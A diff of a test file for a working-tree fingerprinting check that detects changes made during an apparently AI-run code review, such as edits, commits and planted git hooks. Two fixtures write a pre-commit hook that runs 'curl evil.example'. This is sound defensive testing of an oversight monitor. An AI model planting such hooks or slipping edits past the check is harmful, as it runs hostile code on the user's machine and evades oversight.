@@ -263,14 +263,72 @@ test("fingerprintWorkingTree catches new files and further edits to already-modi
   fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v2';\n");
 
   const before = fingerprintWorkingTree(cwd);
-  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), [], "an idle tree must not trip");
+  assert.equal(before.incomplete, null);
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), { changed: [], unverified: null }, "an idle tree must not trip");
 
   fs.writeFileSync(path.join(cwd, "leaked.txt"), "x\n");
   // Already modified, so the status code does not move — and this edit keeps
-  // the line counts too, so only the content of the diff gives it away.
+  // the size and line counts too, so only the content hash gives it away.
   fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v3';\n");
 
-  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), ["a.js", "leaked.txt"]);
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["a.js", "leaked.txt"]);
+});
+
+/**
+ * A partial snapshot is not proof of an unchanged tree. If any step of the
+ * fingerprint fails, the comparison has to say the tree is unverified rather
+ * than report nothing changed.
+ */
+test("diffWorkingTreeFingerprints reports an incomplete snapshot as unverified", () => {
+  const complete = { entries: new Map([["a.js", " M abc"], ["b.js", " M def"]]), incomplete: null };
+  const partial = { entries: new Map([["a.js", " M"], ["b.js", "M "], ["new.txt", "?? 3@1"]]), incomplete: "git hash-object failed: boom" };
+
+  const result = diffWorkingTreeFingerprints(complete, partial);
+  assert.equal(result.unverified, "git hash-object failed: boom");
+  assert.deepEqual(
+    result.changed,
+    ["b.js", "new.txt"],
+    "only the status codes are comparable, so the missing hash on a.js is not an edit while a re-staged file and a new one still show"
+  );
+});
+
+/** A write through an untracked symlink lands on the target; stat follows it. */
+test("fingerprintWorkingTree sees a write through an untracked symlink", () => {
+  const cwd = makeTempDir();
+  initGitRepo(cwd);
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
+  run("git", ["add", "a.js"], { cwd });
+  run("git", ["commit", "-m", "init"], { cwd });
+  const outside = path.join(makeTempDir(), "outside.txt");
+  fs.writeFileSync(outside, "before\n");
+  fs.symlinkSync(outside, path.join(cwd, "link.txt"));
+
+  const before = fingerprintWorkingTree(cwd);
+  fs.writeFileSync(outside, "after: rewritten through the link\n");
+
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["link.txt"]);
+});
+
+/**
+ * In a linked worktree `--git-dir` is the per-worktree administrative
+ * directory; hooks and the shared config live in the common directory. A hook
+ * planted there runs on the user's next commit from any worktree.
+ */
+test("fingerprintWorkingTree catches a hook planted in the common git directory of a linked worktree", () => {
+  const main = makeTempDir();
+  initGitRepo(main);
+  fs.writeFileSync(path.join(main, "a.js"), "export const value = 'v1';\n");
+  run("git", ["add", "a.js"], { cwd: main });
+  run("git", ["commit", "-m", "init"], { cwd: main });
+  const linked = path.join(makeTempDir(), "linked");
+  const added = run("git", ["worktree", "add", "-b", "linked", linked], { cwd: main });
+  assert.equal(added.status, 0, added.stderr);
+
+  const before = fingerprintWorkingTree(linked);
+  fs.mkdirSync(path.join(main, ".git", "hooks"), { recursive: true });
+  fs.writeFileSync(path.join(main, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil.example\n");
+
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(linked)).changed, [".git/hooks/pre-commit"]);
 });
 
 test("fingerprintWorkingTree catches a hook planted inside .git", () => {
@@ -284,7 +342,7 @@ test("fingerprintWorkingTree catches a hook planted inside .git", () => {
   fs.mkdirSync(path.join(cwd, ".git", "hooks"), { recursive: true });
   fs.writeFileSync(path.join(cwd, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil.example\n");
 
-  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), [".git/hooks/pre-commit"]);
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, [".git/hooks/pre-commit"]);
 });
 
 test("fingerprintWorkingTree catches a commit that leaves the tree looking untouched", () => {
@@ -298,7 +356,7 @@ test("fingerprintWorkingTree catches a commit that leaves the tree looking untou
   const before = fingerprintWorkingTree(cwd);
   run("git", ["commit", "-am", "committed by the review"], { cwd });
 
-  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), ["HEAD", "a.js"]);
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["HEAD", "a.js"]);
 });
 
 test("fingerprintWorkingTree works before the first commit", () => {
@@ -306,7 +364,28 @@ test("fingerprintWorkingTree works before the first commit", () => {
   initGitRepo(cwd);
   const before = fingerprintWorkingTree(cwd);
   fs.writeFileSync(path.join(cwd, "x.txt"), "x\n");
-  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), ["x.txt"]);
+  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["x.txt"]);
+});
+
+/**
+ * A binary, a nested repository, or an unreadable path is not in the prompt
+ * but is still part of the change, so an answer given without a tool call
+ * cannot have looked at it.
+ */
+test("collectReviewContext treats a skipped untracked entry as needing inspection", () => {
+  const cwd = makeTempDir();
+  initGitRepo(cwd);
+  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
+  run("git", ["add", "a.js"], { cwd });
+  run("git", ["commit", "-m", "init"], { cwd });
+  fs.writeFileSync(path.join(cwd, "blob.bin"), Buffer.from([0, 1, 2, 3, 0, 255, 254, 0, 0, 0]));
+
+  const target = resolveReviewTarget(cwd, {});
+  const context = collectReviewContext(cwd, target);
+
+  assert.equal(context.inputMode, "inline-diff");
+  assert.match(context.content, /blob\.bin\n\(skipped: binary file\)/);
+  assert.equal(context.inlinedEverything, false, "the prompt does not carry the binary, so grok has to look");
 });
 
 /**
